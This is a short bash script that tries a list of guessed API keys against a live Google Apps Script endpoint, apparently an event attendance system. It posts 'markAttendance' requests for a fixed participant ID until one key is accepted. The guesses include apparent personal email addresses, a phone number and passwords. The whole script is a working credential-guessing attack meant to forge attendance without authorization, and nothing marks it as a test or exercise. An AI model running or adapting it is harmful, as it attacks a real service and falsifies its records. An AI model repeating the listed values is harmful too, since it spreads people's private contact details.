#!/usr/bin/env bash
url="https://script.google.com/macros/s/AKfycbyUF7tO0o9V61BsOozeDHvU7CSyQzMfeRws5FChCIAyrQ_Vb_359VTLj-X7cIVpAQhIAA/exec"

keys=(
  "Aegis.CEO@03"
  "SYNTRONIX_2026"
  "SYNTRONIX26"
  "SYN26"
  "syntronix"
  "Sakthi@123"
  "8438266090"
  "sakthisakthi7791@gmail.com"
  "megu.muffin"
  "megnaishere@gmail.com"
  "admin"
  "123456"
  "Syntronix@26"
  "egspec"
  "EGSPEC"
)

for k in "${keys[@]}"; do
  res=$(curl -s -L -X POST -H "Content-Type: application/json" -d "{\"action\":\"markAttendance\",\"apiKey\":\"$k\",\"uniqueId\":\"SYN26-0002\"}" "$url")
  if [[ "$res" != *"Invalid API key"* ]]; then
    echo "SUCCESS KEY FOUND: $k -> $res"
    exit 0
  fi
done
echo "No key matched in short list."
